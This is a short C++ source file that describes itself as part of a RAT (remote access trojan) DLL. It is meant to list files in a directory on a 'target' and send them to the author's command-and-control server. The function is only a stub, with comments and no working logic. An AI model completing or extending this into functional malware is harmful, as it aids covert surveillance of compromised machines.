// Patrick Sacchet (@pjsacchet)
// Verison 1.0.
// RAT-Dll-DirList.cpp : Defines functionality for performing a dir list on target, i.e., returning a list of files within a certain directory to our C2


#include "RAT-Dll-DirList.h"

INT performDirList(__in const char* dirPath, __inout char** dirFiles)
{
	INT status = SUCCESS;
	UINT32 numFiles = 0;

	// First pass will be so we can properly allocate our buffer for number of files we have





	// Second pass will be to actually store the files we found
		// NOTE: if the target user somehow adds or deletes files between this first and second pass there may not be enough allocated memory







cleanup:
	return status;
}